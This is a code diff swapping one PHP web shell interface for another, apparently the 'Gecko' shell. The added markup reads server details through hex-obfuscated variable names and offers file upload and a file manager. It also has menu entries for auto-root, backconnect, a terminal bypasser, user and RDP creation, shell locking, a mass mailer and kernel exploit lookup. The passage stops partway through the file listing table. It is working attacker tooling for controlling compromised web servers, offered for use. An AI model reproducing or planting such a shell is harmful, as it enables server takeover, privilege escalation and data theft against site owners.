-    .popup.error .popup-icon{background:rgba(239,68,68,.15);border:2px solid rgba(239,68,68,.5);color:#f87171;box-shadow:0 0 25px rgba(239,68,68,.6)}
-    .popup-title{font-size:20px;font-weight:800;margin-bottom:10px;letter-spacing:.5px}
-    .popup.success .popup-title{color:#60a5fa;text-shadow:0 0 15px rgba(96,165,250,.6)}
-    .popup.error .popup-title{color:#f87171;text-shadow:0 0 15px rgba(248,113,113,.6)}
-    .popup-msg{font-size:14px;color:#e2e8f0;line-height:1.5;word-break:break-word;margin-bottom:20px}
-    .popup-msg b{color:#fff}
-    .popup-btn{background:linear-gradient(135deg,#1e3a8a,#2563eb);color:#fff;border:0;padding:10px 30px;border-radius:9px;font-weight:700;font-size:13px;letter-spacing:.8px;cursor:pointer;font-family:inherit;box-shadow:0 0 20px rgba(37,99,235,.5);transition:all .2s}
-    .popup-btn:hover{transform:translateY(-2px);box-shadow:0 0 30px rgba(37,99,235,.9)}
-    .popup.success .popup-btn{background:linear-gradient(135deg,#2563eb,#1d4ed8);box-shadow:0 0 20px rgba(37,99,235,.5)}
-    .popup.success .popup-btn:hover{box-shadow:0 0 30px rgba(37,99,235,.9)}
-    .popup.error .popup-btn{background:linear-gradient(135deg,#ef4444,#dc2626);box-shadow:0 0 20px rgba(239,68,68,.5)}
-    .popup.error .popup-btn:hover{box-shadow:0 0 30px rgba(239,68,68,.9)}
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Gecko [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
+    <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        .btn-submit,
+        a {
+            text-decoration: none;
+            color: #fff
+        }
 
-    /* ===== INFO BAR ===== */
-    .info-bar{display:flex;align-items:center;gap:18px;background:linear-gradient(145deg,rgba(10,20,40,.85),rgba(15,30,60,.85));backdrop-filter:blur(15px);border:1px solid rgba(59,130,246,.35);border-radius:16px;padding:16px 20px;margin-bottom:18px;box-shadow:0 0 30px rgba(37,99,235,.25),inset 0 0 20px rgba(59,130,246,.05);flex-wrap:wrap}
-    .info-logo{width:80px;height:80px;border-radius:50%;padding:3px;flex-shrink:0;background:linear-gradient(135deg,#1e3a8a,#2563eb,#60a5fa);box-shadow:0 0 22px rgba(37,99,235,.9),0 0 45px rgba(96,165,250,.5);animation:logoGlow 3s ease-in-out infinite;overflow:hidden}
-    @keyframes logoGlow{0%,100%{box-shadow:0 0 22px rgba(37,99,235,.9),0 0 45px rgba(96,165,250,.5)}50%{box-shadow:0 0 32px rgba(96,165,250,1),0 0 60px rgba(37,99,235,.8)}}
-    .info-logo img{width:100%;height:100%;border-radius:50%;object-fit:cover;display:block}
-    .info-content{flex:1;min-width:0;display:flex;flex-direction:column;gap:8px}
-    .info-title-row{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
-    .info-title{font-size:20px;font-weight:800;background:linear-gradient(135deg,#93c5fd,#60a5fa,#3b82f6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:1px}
-    .live-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(59,130,246,.15);border:1px solid rgba(59,130,246,.4);color:#60a5fa;padding:2px 8px;border-radius:6px;font-size:10px;font-weight:700;letter-spacing:.5px}
-    .live-badge::before{content:'';width:6px;height:6px;border-radius:50%;background:#60a5fa;box-shadow:0 0 6px #60a5fa;animation:blink 1.5s infinite}
-    @keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
-    .info-top-actions{margin-left:auto;display:flex;gap:8px;flex-shrink:0;flex-wrap:wrap}
-    .info-top-actions a, .info-top-actions button{display:flex;align-items:center;gap:5px;padding:7px 13px;border-radius:8px;background:rgba(59,130,246,.15);border:1px solid rgba(59,130,246,.35);color:#93c5fd;text-decoration:none;font-size:12px;font-weight:600;transition:all .2s;font-family:inherit;cursor:pointer}
-    .info-top-actions a:hover, .info-top-actions button:hover{background:rgba(59,130,246,.3);border-color:#60a5fa;color:#fff;box-shadow:0 0 12px rgba(59,130,246,.5)}
-    .info-top-actions a.logout{color:#fca5a5;border-color:rgba(239,68,68,.4);background:rgba(239,68,68,.1)}
-    .info-top-actions a.logout:hover{background:rgba(239,68,68,.25);border-color:#ef4444;box-shadow:0 0 12px rgba(239,68,68,.5)}
-    .info-top-actions button.terminal-btn{color:#4ade80;border-color:rgba(74,222,128,.4);background:rgba(74,222,128,.1)}
-    .info-top-actions button.terminal-btn:hover{background:rgba(74,222,128,.25);border-color:#4ade80;box-shadow:0 0 12px rgba(74,222,128,.5);color:#fff}
-    .info-chips{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
-    .info-chips .chip{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:6px;background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.2);color:#93c5fd;font-family:'JetBrains Mono','Courier New',monospace;font-size:11px}
-    .info-chips .chip b{color:#fff;font-weight:600}
-    .info-chips .chip.pct{border-color:rgba(96,165,250,.4);background:rgba(96,165,250,.12);color:#bfdbfe}
+        a,
+        body {
+            color: #fff
+        }
 
-    /* ===== PWD BAR ===== */
-    .pwd-bar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;background:rgba(10,20,40,.7);border:1px solid rgba(59,130,246,.3);border-radius:12px;padding:13px 16px;margin-bottom:18px;box-shadow:0 0 20px rgba(37,99,235,.2)}
-    .pwd-bar > svg{color:#60a5fa;flex-shrink:0}
-    .pwd-bar .lbl{color:#93c5fd;font-size:10.5px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;margin-right:4px}
-    .pwd-crumbs{display:inline-flex;align-items:center;flex-wrap:wrap;font-family:'JetBrains Mono','Courier New',monospace;font-weight:700;font-size:13px}
-    .pwd-crumbs .seg{padding:4px 9px;border-radius:6px;color:#93c5fd;text-decoration:none;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:4px}
-    .pwd-crumbs .seg:hover{background:rgba(59,130,246,.3);color:#fff;box-shadow:0 0 12px rgba(59,130,246,.7);text-shadow:0 0 8px rgba(96,165,250,.8)}
-    .pwd-crumbs .seg.root{color:#60a5fa;text-shadow:0 0 8px rgba(96,165,250,.7)}
-    .pwd-crumbs .seg.root:hover{text-shadow:0 0 14px rgba(96,165,250,1)}
-    .pwd-crumbs .seg.current{background:rgba(96,165,250,.25);color:#bfdbfe;border:1px solid rgba(96,165,250,.5);box-shadow:0 0 12px rgba(96,165,250,.5);cursor:default;pointer-events:none;text-shadow:0 0 10px rgba(191,219,254,.8)}
-    .pwd-crumbs .sep{color:#475569;user-select:none;margin:0 1px;font-size:13px}
-    .pwd-bar .tag{color:#93c5fd;font-size:10.5px;font-weight:600;margin-left:auto;opacity:.8}
+        .btn-submit,
+        .form-file,
+        tbody tr:nth-child(2n) {
+            background-color: #22242d
+        }
 
-    /* ===== TOOLBAR ===== */
-    .toolbar{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin-bottom:18px}
-    .tool{background:rgba(10,20,40,.6);backdrop-filter:blur(10px);border:1px solid rgba(59,130,246,.25);border-radius:11px;padding:12px 14px;transition:all .2s}
-    .tool:hover{border-color:rgba(59,130,246,.5);box-shadow:0 0 16px rgba(37,99,235,.3)}
-    .tool form{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
-    .tool .lbl-top{display:flex;align-items:center;gap:6px;color:#60a5fa;font-size:10.5px;font-weight:700;margin-bottom:8px;text-transform:uppercase;letter-spacing:.8px;width:100%}
-    input[type=text],input[type=file]{flex:1;min-width:80px;background:rgba(4,8,20,.9);border:1px solid rgba(59,130,246,.3);color:#e2e8f0;padding:8px 11px;border-radius:7px;font-size:12.5px;outline:none;font-family:inherit;transition:all .2s}
-    input[type=text]:focus{border-color:#60a5fa;box-shadow:0 0 0 2px rgba(59,130,246,.2)}
-    input::placeholder{color:#64748b}
-    input[type=file]::file-selector-button{background:linear-gradient(135deg,#1e3a8a,#2563eb);border:0;color:#fff;padding:5px 10px;border-radius:5px;cursor:pointer;font-weight:600;font-size:11.5px;margin-right:6px}
-    .btn{background:linear-gradient(135deg,#1e3a8a,#2563eb);color:#fff;border:0;padding:8px 14px;border-radius:7px;cursor:pointer;font-weight:700;font-size:11.5px;display:inline-flex;align-items:center;gap:5px;letter-spacing:.4px;box-shadow:0 0 10px rgba(37,99,235,.5);transition:all .2s;font-family:inherit}
-    .btn:hover{transform:translateY(-1px);box-shadow:0 0 18px rgba(37,99,235,.9)}
+        .code-editor,
+        .modal,
+        .terminal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0
+        }
 
-    /* ===== TABLE ===== */
-    .table-wrap{background:rgba(10,20,40,.6);backdrop-filter:blur(10px);border:1px solid rgba(59,130,246,.25);border-radius:12px;overflow:hidden;box-shadow:0 0 22px rgba(37,99,235,.15)}
-    table{width:100%;border-collapse:collapse}
-    th{background:rgba(59,130,246,.12);color:#93c5fd;padding:12px 16px;text-align:left;font-size:10.5px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;border-bottom:1px solid rgba(59,130,246,.3)}
-    td{padding:11px 16px;border-bottom:1px solid rgba(59,130,246,.08);font-size:12.5px}
-    tbody tr{transition:background .2s;animation:rowIn .35s ease backwards}
-    @keyframes rowIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
-    tbody tr:hover{background:rgba(59,130,246,.07)}
-    tbody tr:last-child td{border-bottom:0}
-    .name-cell{display:flex;align-items:center;gap:9px}
-    .name-cell svg{color:#60a5fa}
-    .name-cell.folder svg{color:#93c5fd}
-    .name-cell a{color:#e2e8f0;text-decoration:none;transition:.2s}
-    .name-cell a:hover{color:#93c5fd;text-shadow:0 0 8px rgba(96,165,250,.6)}
-    .meta{color:#64748b;font-size:11.5px}
-    .perm{background:rgba(37,99,235,.15);color:#bfdbfe;padding:2px 7px;border-radius:5px;font-size:10.5px;font-family:'Courier New',monospace;font-weight:600;border:1px solid rgba(37,99,235,.3)}
-    .actions{display:flex;gap:5px;justify-content:flex-end}
-    .act{width:30px;height:30px;display:inline-flex;align-items:center;justify-content:center;border-radius:8px;background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.25);color:#60a5fa;text-decoration:none;transition:all .2s;cursor:pointer}
-    .act:hover{background:rgba(59,130,246,.3);border-color:#60a5fa;color:#fff;box-shadow:0 0 12px rgba(37,99,235,.7);transform:translateY(-1px)}
-    .act.rename{color:#fbbf24;background:rgba(251,191,36,.1);border-color:rgba(251,191,36,.3)}
-    .act.rename:hover{background:rgba(251,191,36,.25);border-color:#fbbf24;color:#fff;box-shadow:0 0 12px rgba(251,191,36,.7)}
-    .act.chmod{color:#38bdf8;background:rgba(56,189,248,.1);border-color:rgba(56,189,248,.3)}
-    .act.chmod:hover{background:rgba(56,189,248,.25);border-color:#38bdf8;color:#fff;box-shadow:0 0 12px rgba(56,189,248,.7)}
-    .act.danger{color:#f87171;background:rgba(239,68,68,.1);border-color:rgba(239,68,68,.3)}
-    .act.danger:hover{background:rgba(239,68,68,.3);border-color:#ef4444;color:#fff;box-shadow:0 0 12px rgba(239,68,68,.8);transform:translateY(-1px)}
-    .act.danger.folder-del{background:rgba(220,38,38,.15);border-color:rgba(220,38,38,.4)}
-    .empty{text-align:center;padding:40px;color:#64748b;font-size:13px}
+        .code-editor-body textarea,
+        .terminal-body textarea {
+            width: 98.5%;
+            height: 400px;
+            font-size: smaller;
+            resize: none
+        }
 
-    /* ===== DIVIDER SECTION (RAPI & TIPIS) ===== */
-    .divider-row td{
-        padding:6px 16px;
-        background:transparent !important;
-        border-bottom:1px solid rgba(59,130,246,.12) !important;
-    }
-    .divider-row .dv-inner{
-        display:flex;align-items:center;gap:10px;
-        color:#60a5fa;
-        font-size:9.5px;
-        font-weight:700;
-        letter-spacing:2px;
-        text-transform:uppercase;
-    }
-    .divider-row .dv-inner::after{
-        content:'';
-        flex:1;
-        height:1px;
-        background:linear-gradient(90deg, rgba(59,130,246,.35), transparent);
-    }
-    .divider-row .dv-count{
-        background:rgba(59,130,246,.15);
-        border:1px solid rgba(96,165,250,.3);
-        color:#bfdbfe;
-        padding:0 6px;
-        border-radius:4px;
-        font-size:9px;
-        font-weight:700;
-        font-family:'JetBrains Mono',monospace;
-        letter-spacing:0;
-        line-height:1.6;
-    }
-    .divider-row.files .dv-inner{
-        color:#a78bfa;
-    }
-    .divider-row.files .dv-inner::after{
-        background:linear-gradient(90deg, rgba(139,92,246,.35), transparent);
-    }
-    .divider-row.files .dv-count{
-        background:rgba(139,92,246,.15);
-        border-color:rgba(167,139,250,.3);
-        color:#ddd6fe;
-    }
+        .menu-tools li,
+        .terminal-body li,
+        .terminal-head li {
+            display: inline-block
+        }
 
-    /* ===== TERMINAL MODAL ===== */
-    .terminal-overlay{
-        position:fixed;inset:0;
-        background:rgba(0,0,0,.75);
-        backdrop-filter:blur(6px);
-        z-index:9998;
-        display:none;
-        align-items:center;justify-content:center;
-        padding:20px;
-        animation:fadeOverlay .25s ease;
-    }
-    .terminal-overlay.active{display:flex}
-    .terminal-box{
-        width:100%;max-width:900px;
-        height:80vh;max-height:650px;
-        background:#02060f;
-        border:1px solid rgba(74,222,128,.35);
-        border-radius:14px;
-        overflow:hidden;
-        display:flex;flex-direction:column;
-        box-shadow:0 0 40px rgba(74,222,128,.25),0 20px 60px rgba(0,0,0,.7);
-        animation:termIn .3s ease;
-    }
-    @keyframes termIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
-    .term-header{
-        display:flex;align-items:center;gap:10px;
-        padding:10px 14px;
-        background:linear-gradient(180deg,rgba(20,30,50,.95),rgba(15,20,35,.95));
-        border-bottom:1px solid rgba(74,222,128,.2);
-    }
-    .term-dots{display:flex;gap:6px}
-    .term-dots span{width:11px;height:11px;border-radius:50%}
-    .term-dots .d1{background:#ef4444;box-shadow:0 0 6px rgba(239,68,68,.6)}
-    .term-dots .d2{background:#fbbf24;box-shadow:0 0 6px rgba(251,191,36,.6)}
-    .term-dots .d3{background:#4ade80;box-shadow:0 0 6px rgba(74,222,128,.6)}
-    .term-title{
-        flex:1;color:#4ade80;
-        font-family:'JetBrains Mono','Courier New',monospace;
-        font-size:12px;font-weight:700;letter-spacing:1px;
-        display:flex;align-items:center;gap:6px;
-        text-shadow:0 0 10px rgba(74,222,128,.6);
-    }
-    .term-close{
-        background:rgba(239,68,68,.15);
-        border:1px solid rgba(239,68,68,.4);
-        color:#f87171;
-        width:26px;height:26px;border-radius:6px;
-        cursor:pointer;display:flex;align-items:center;justify-content:center;
-        transition:all .2s;font-family:inherit;
-    }
-    .term-close:hover{background:rgba(239,68,68,.35);color:#fff;box-shadow:0 0 10px rgba(239,68,68,.7)}
-    .term-body{
-        flex:1;overflow-y:auto;
-        padding:14px 16px;
-        font-family:'JetBrains Mono','Courier New',monospace;
-        font-size:13px;line-height:1.55;
-        color:#cbd5e1;
-        background:#02060f;
-        cursor:text;
-    }
-    .term-body::-webkit-scrollbar{width:8px}
-    .term-body::-webkit-scrollbar-track{background:rgba(74,222,128,.03)}
-    .term-body::-webkit-scrollbar-thumb{background:rgba(74,222,128,.25);border-radius:4px}
-    .term-body::-webkit-scrollbar-thumb:hover{background:rgba(74,222,128,.45)}
-    .term-line{white-space:pre-wrap;word-break:break-all}
-    .term-line.cmd-line{color:#4ade80}
-    .term-line.err-line{color:#f87171}
-    .term-line.info-line{color:#60a5fa}
-    .term-prompt{color:#4ade80;font-weight:700}
-    .term-prompt .user{color:#fbbf24}
-    .term-prompt .path{color:#60a5fa}
-    .term-prompt .sym{color:#4ade80}
-    .term-input-line{
-        display:flex;align-items:center;gap:0;
-        margin-top:4px;
-    }
-    .term-input-line .term-prompt{flex-shrink:0;margin-right:6px;user-select:none}
-    .term-input{
-        flex:1;
-        background:transparent;
-        border:0;outline:0;
-        color:#e2e8f0;
-        font-family:'JetBrains Mono','Courier New',monospace;
-        font-size:13px;
-        caret-color:#4ade80;
-        padding:0;
-    }
-    .term-hint{
-        padding:6px 14px;
-        background:rgba(74,222,128,.05);
-        border-top:1px solid rgba(74,222,128,.15);
-        color:#64748b;
-        font-size:10.5px;
-        font-family:'JetBrains Mono',monospace;
-        display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;
-    }
-    .term-hint kbd{
-        background:rgba(74,222,128,.12);
-        border:1px solid rgba(74,222,128,.3);
-        color:#4ade80;
-        padding:1px 6px;border-radius:4px;
-        font-size:9.5px;font-weight:700;
-    }
+        body {
+            background-color: #0e0f17;
+            font-family: monospace
+        }
 
-    @media(max-width:768px){
-        body{padding:14px}
-        .hide-mobile{display:none}
-        .info-logo{width:60px;height:60px}
-        .info-title{font-size:16px}
-        .info-top-actions{margin-left:0;width:100%}
-        .pwd-crumbs{font-size:11.5px}
-        .pwd-crumbs .seg{padding:3px 6px}
-        .info-chips .chip{font-size:10px;padding:3px 7px}
-        .popup{min-width:280px;padding:26px 24px 22px}
-        .popup-icon{width:60px;height:60px}
-        .popup-title{font-size:17px}
-        .popup-msg{font-size:12.5px}
-        .terminal-box{height:90vh}
-        .term-body{font-size:12px;padding:10px 12px}
-    }
-</style>
+        .btn-modal-close:hover,
+        .btn-submit:hover,
+        .menu-file-manager ul,
+        .path-pwd,
+        thead {
+            background-color: #2e313d
+        }
+
+        ul {
+            list-style: none
+        }
+
+        .menu-header li {
+            padding: 5px 0
+        }
+
+        .menu-header ul li {
+            font-weight: 700;
+            font-style: italic
+        }
+
+        .btn-submit {
+            padding: 7px 25px;
+            border: 2px solid grey;
+            border-radius: 4px
+        }
+
+        .form-file,
+        a:hover {
+            color: #c5c8d6
+        }
+
+        .btn-submit:hover {
+            border: 2px solid #c5c8d6
+        }
+
+        .form-upload {
+            margin: 10px 0
+        }
+
+        .form-file {
+            border: 2px solid grey;
+            padding: 7px 20px;
+            border-radius: 4px
+        }
+
+        .menu-tools {
+            width: 95%
+        }
+
+        .menu-tools li {
+            margin: 15px 0
+        }
+
+        .menu-file-manager,
+        .modal-mail-text {
+            margin: 10px 40px
+        }
+
+        .menu-file-manager li {
+            display: inline-block;
+            margin: 15px 20px
+        }
+
+        .menu-file-manager li a::after {
+            content: "";
+            display: block;
+            border-bottom: 1px solid #fff
+        }
+
+        .path-pwd {
+            padding: 15px 0;
+            margin: 5px 0
+        }
+
+        table {
+            border-radius: 5px
+        }
+
+        thead {
+            height: 35px
+        }
+
+        tbody tr td {
+            padding: 10px 0
+        }
+
+        tbody tr td:nth-child(2),
+        tbody tr td:nth-child(3),
+        tbody tr td:nth-child(4) {
+            text-align: center
+        }
+
+        ::-webkit-scrollbar {
+            width: 16px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0e0f17
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #22242d;
+            border: 2px solid #555;
+            border-radius: 4px
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555
+        }
+
+        ::-webkit-file-upload-button {
+            display: none
+        }
+
+        .modal {
+            display: none;
+            z-index: 2;
+            width: 100%;
+            background-color: rgba(0, 0, 0, .3)
+        }
+
+        .modal-container {
+            animation-name: modal-pop-out;
+            animation-duration: .7s;
+            animation-fill-mode: both;
+            margin: 10% auto auto;
+            border-radius: 10px;
+            width: 800px;
+            background-color: #f4f4f9
+        }
+
+        @keyframes modal-pop-out {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        .modal-header {
+            color: #000;
+            margin-left: 30px;
+            padding: 10px
+        }
+
+        .modal-body,
+        .terminal-head li {
+            color: #000
+        }
+
+        .modal-create-input {
+            width: 700px;
+            padding: 10px 5px;
+            background-color: #f4f4f9;
+            margin: 0 5%;
+            border: none;
+            border-radius: 4px;
+            box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
+            border-bottom: 2px solid #0e0f17
+        }
+
+        .box-shadow {
+            box-shadow: 8px 8px 8px rgba(0, 0, 0, .2)
+        }
+
+        .btn-modal-close {
+            background-color: #22242d;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 35px
+        }
+
+        .badge-action-chmod:hover::after,
+        .badge-action-download:hover::after,
+        .badge-action-editor:hover::after {
+            padding: 5px;
+            border-radius: 5px;
+            margin-left: 110px;
+            background-color: #2e313d
+        }
+
+        .modal-btn-form {
+            margin: 15px 0;
+            padding: 10px;
+            text-align: right
+        }
+
+        .file-size {
+            color: orange
+        }
+
+        .badge-root::after {
+            content: "root";
+            display: block;
+            position: absolute;
+            width: 40px;
+            text-align: center;
+            margin-top: -30px;
+            margin-left: 110px;
+            border-radius: 4px;
+            background-color: red
+        }
+
+        .badge-action-chmod:hover::after,
+        .badge-action-download:hover::after,
+        .badge-action-editor:hover::after,
+        .badge-linux::after,
+        .badge-windows::after {
+            width: 60px;
+            text-align: center;
+            margin-top: -30px;
+            display: block;
+            position: absolute
+        }
+
+        .badge-windows::after {
+            background-color: orange;
+            color: #000;
+            margin-left: 100px;
+            border-radius: 4px;
+            content: "windows"
+        }
+
+        .badge-linux::after {
+            margin-left: 100px;
+            border-radius: 4px;
+            background-color: #0047a3;
+            content: "linux"
+        }
+
+        .badge-action-editor:hover::after {
+            content: "Rename"
+        }
+
+        .badge-action-chmod:hover::after {
+            content: "Chmod"
+        }
+
+        .badge-action-download:hover::after {
+            content: "Download"
+        }
+
+        .code-editor,
+        .terminal {
+            background-color: rgba(0, 0, 0, .3);
+            width: 100%
+        }
+
+        .code-editor-container {
+            background-color: #f4f4f9;
+            color: #000;
+            width: 95%;
+            margin: 40px auto auto;
+            border-radius: 10px
+        }
+
+        .code-editor-head {
+            padding: 15px;
+            font-weight: 700
+        }
+
+        .code-editor-body textarea {
+            border-radius: 4px;
+            margin: 0 4px;
+            background-color: #22242d;
+            color: #fff
+        }
+
+        .terminal-container {
+            animation: .5s both modal-pop-out;
+            width: 90%;
+            background-color: #f4f4f9;
+            margin: 25px auto auto;
+            color: #000;
+            border-radius: 4px
+        }
+
+        .bc-gecko,
+        .mail,
+        .terminal-input {
+            background-color: #22242d;
+            color: #fff
+        }
+
+        .terminal-head {
+            padding: 8px
+        }
+
+        .terminal-head li a {
+            color: #000;
+            position: absolute;
+            right: 0;
+            margin-right: 110px;
+            font-weight: 700;
+            margin-top: -20px;
+            font-size: 25px;
+            padding: 1px 10px
+        }
+
+        .terminal-body textarea {
+            margin: 4px;
+            background-color: #22242d;
+            color: #29db12;
+            border-radius: 4px
+        }
+
+        .active {
+            display: block
+        }
+
+        .terminal-input {
+            width: 500px;
+            padding: 6px;
+            border: 1px solid #22242d;
+            border-radius: 4px;
+            margin: 5px 0
+        }
+
+        .bc-gecko {
+            border: none;
+            padding: 7px 10px;
+            width: 712px;
+            border-radius: 5px;
+            margin: 15px 40px
+        }
+
+        .mail {
+            width: 705px;
+            resize: none;
+            height: 100px
+        }
+
+        .logo-gecko {
+            position: absolute;
+            top: -90px;
+            right: 40px;
+            z-index: -1;
+            bottom: 0
+        }
+    </style>
 </head>
+
 <body>
-
-<?php if ($notify): ?>
-<div class="popup-overlay" onclick="closePopup()"></div>
-<div class="popup <?=htmlspecialchars($notify['type'])?>" id="popup">
-    <div class="popup-icon">
-        <?php if ($notify['type'] === 'success'): ?>
-            <?=icon('check', 36)?>
-        <?php else: ?>
-            <?=icon('alert', 36)?>
-        <?php endif; ?>
+    <div class="menu-header">
+        <ul>
+            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
+            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
+            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
+            <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
+            <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
+            <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
+            <li class="logo-gecko"><img width="400" height="400" src="https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko1.png" align="right"></li>
+            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
+                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
+            </form>
+        </ul>
     </div>
-    <div class="popup-title"><?=$notify['type'] === 'success' ? 'BERHASIL!' : 'GAGAL!'?></div>
-    <div class="popup-msg"><?=htmlspecialchars($notify['msg'])?></div>
-    <button class="popup-btn" onclick="closePopup()">OK</button>
-</div>
-<script>
-    <?php if ($notify['type'] === 'success'): ?>
-    setTimeout(closePopup, 3000);
+    <div class="menu-tools">
+        <ul>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit">Terminal</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root">AUTO ROOT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit">Adminer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit">Backdoor Destroyer</a></li>
+            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit">Linux Exploit</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit">Lock Shell</a></li>
+            <li><a href="" class="btn-submit badge-linux" id="lock-file">Lock File</a></li>
+            <li><a href="" class="btn-submit badge-root" id="root-user">Create User</a></li>
+            <li><a href="" class="btn-submit" id="create-rdp">CREATE RDP</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit">PHP Mailer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit">BACKCONNECT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=bypasser" class="btn-submit">TERMINAL BYPASSER</a></li>
+            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit">HASH IDENTIFIER</a></li>
+            <li><a href="" class="btn-submit badge-windows" id="lock-windows">Lock File</a></li>
+            <li><a href="" class="btn-submit">RCE OVW</a></li>
+            <li><a href="" class="btn-submit">UPLD OVW</a></li>
+            <li><a href="" class="btn-submit">JUMPPER</a></li>
+            <li><a href="" class="btn-submit">CGIPRO</a></li>
+            <li><a href="" class="btn-submit">DOMAIN LOOKUP</a></li>
+            <li><a href="" class="btn-submit">WHOIS</a></li>
+            <li><a href="" class="btn-submit">CPANEL RESET</a></li>
+            <li><a href="" class="btn-submit">CONFIG READER!</a></li>
+            <li><a href="" class="btn-submit">COMPRESSOR</a></li>
+            <li><a href="//github.com/MadExploits/" class="btn-submit">README</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&logout=True" class="btn-submit">LOGOUT!</a></li>
+        </ul>
+    </div>
+
+    <?php
+
+    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
+    $get_cwd = $fungsi[0]();
+    ?>
+
+    <div class="menu-file-manager">
+        <ul>
+            <li><a href="" id="create_folder">+ Create Folder</a></li>
+            <li><a href="" id="create_file">+ Create File</a></li>
+        </ul>
+        <div class="path-pwd">
+            <?php
+            $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
+            $pwd = explode("/", $cwd);
+            if (stristr(PHP_OS, "WIN")) {
+                windowsDriver();
+            }
+            foreach ($pwd as $id => $val) {
+                if ($val == '' && $id == 0) {
+                    echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
+                    continue;
+                }
+                if ($val == '') continue;
+                echo '<a href="?d=';
+                for ($i = 0; $i <= $id; $i++) {
+                    echo hx($pwd[$i]);
+                    if ($i != $id) echo hx("/");
+                }
+                echo '">' . $val . ' / ' . '</a>';
+            }
+            echo "<a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
+            ?>
+        </div>
+        </ul>
+        <table style="width: 100%;">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Permission</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <form action="" method="post">
+                <tbody>
+                    <!-- Gecko Folder File Manager -->
+                    <?php foreach ($file_manager as $_D) : ?>
+                        <?php if ($fungsi[2]($_D)) : ?>
+                            <tr>
+                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
+                                <td>[ DIR ]</td>
+                                <td>
+                                    <?php if ($fungsi[4]($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="#00ff00">';
+                                    } elseif (!$fungsi[5]($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="red">';
+                                    }
+                                    echo perms($fungsi[0]() . '/' . $_D);
+                                    ?>
+                                </td>
+                                <!-- Action Folder Manager -->
